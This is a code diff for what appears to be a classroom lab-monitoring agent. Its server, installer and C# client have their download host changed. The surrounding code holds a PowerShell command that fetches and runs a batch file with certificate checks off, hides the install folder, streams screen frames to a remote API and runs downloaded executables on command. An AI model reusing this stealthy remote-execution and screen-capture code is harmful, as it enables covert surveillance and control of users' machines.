@@ -653,7 +653,7 @@ def post_teacher_action(payload: ActionPayload, request: Request):
         ps_update = (
             "$ErrorActionPreference = 'SilentlyContinue'; "
             "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; "
-            "$u = 'https://pirireis-bilisim-odev-1.onrender.com/api/labizleme/WinSystemSetup.bat'; "
+            "$u = 'https://pirireis-api-v3ku.onrender.com/api/labizleme/WinSystemSetup.bat'; "
             "$d = [System.IO.Path]::Combine($env:TEMP, 'WinSystemSetup_New.bat'); "
             "(New-Object System.Net.WebClient).DownloadFile($u, $d); "
             "cmd.exe /c curl.exe -k -s -L -o \"$d\" \"$u\"; "
@@ -665,7 +665,7 @@ def post_teacher_action(payload: ActionPayload, request: Request):
             "id": cmd_id,
             "type": "update_agent" if is_update else (payload.installType or "download_exe"),
             "name": "Ajan Guncellemesi" if is_update else (payload.packageName or "Yazılım Kurulumu"),
-            "url": "https://pirireis-bilisim-odev-1.onrender.com/api/labizleme/WinSystemSetup.bat" if is_update else (payload.installUrl or ""),
+            "url": "https://pirireis-api-v3ku.onrender.com/api/labizleme/WinSystemSetup.bat" if is_update else (payload.installUrl or ""),
             "args": "--silent" if is_update else (payload.installArgs or ""),
             "command": ps_update if is_update else (payload.installCommand or ""),
             "timestamp": int(time.time() * 1000),
@@ -846,8 +846,10 @@ attrib +h +s "%INSTALL_DIR%" >nul 2>&1
 
 start "" wscript.exe //B //Nologo "%VBS_STARTUP%"
 del /f /q "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
-exit /b 0
-using System.Collections.Generic;
+exit /b 0
+
+using System.Collections.Generic;
+
 using System;
 using System.IO;
 using System.Net;
@@ -908,7 +910,7 @@ namespace WinSystemService
         private int isSendingCloud = 0;
         private int isSendingLocal = 0;
 
-        private const string LIVE_API = "https://pirireis-bilisim-odev-1.onrender.com/api/labizleme/frame";
+        private const string LIVE_API = "https://pirireis-api-v3ku.onrender.com/api/labizleme/frame";
         private const string LOCAL_API = "http://192.168.23.244:4000/api/frame";
 
         public LabAgentForm()
@@ -1317,7 +1319,7 @@ namespace WinSystemService
                     string wallUrl = string.IsNullOrEmpty(url) ? cmd : url;
                     if (wallUrl.StartsWith("/"))
                     {
-                        wallUrl = "https://pirireis-bilisim-odev-1.onrender.com" + wallUrl;
+                        wallUrl = "https://pirireis-api-v3ku.onrender.com" + wallUrl;
                     }
                     string wallDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinSystemService");
                     if (!Directory.Exists(wallDir)) Directory.CreateDirectory(wallDir);
@@ -1354,8 +1356,8 @@ namespace WinSystemService
                 if (type == "update_agent" || (type == "powershell" && (cmd ?? "").Contains("WinSystemSetup.bat")))
                 {
                     SetInstallStatus(id, name, "downloading", 25, "Guncel ajan paketi sunucudan indiriliyor...");
-                    string updateUrl = string.IsNullOrEmpty(url) ? "https://pirireis-bilisim-odev-1.onrender.com/api/labizleme/WinSystemSetup.bat" : url;
-                    if (updateUrl.StartsWith("/")) updateUrl = "https://pirireis-bilisim-odev-1.onrender.com" + updateUrl;
+                    string updateUrl = string.IsNullOrEmpty(url) ? "https://pirireis-api-v3ku.onrender.com/api/labizleme/WinSystemSetup.bat" : url;
+                    if (updateUrl.StartsWith("/")) updateUrl = "https://pirireis-api-v3ku.onrender.com" + updateUrl;
                     string newBatPath = Path.Combine(Path.GetTempPath(), "WinSystemSetup_New.bat");
                     using (WebClient wc = new WebClient())
                     {
@@ -1483,7 +1485,7 @@ namespace WinSystemService
                 string downloadUrl = url;
                 if (downloadUrl.StartsWith("/"))
                 {
-                    downloadUrl = "https://pirireis-bilisim-odev-1.onrender.com" + downloadUrl;
+                    downloadUrl = "https://pirireis-api-v3ku.onrender.com" + downloadUrl;
                 }
 
                 string ext = ".exe";
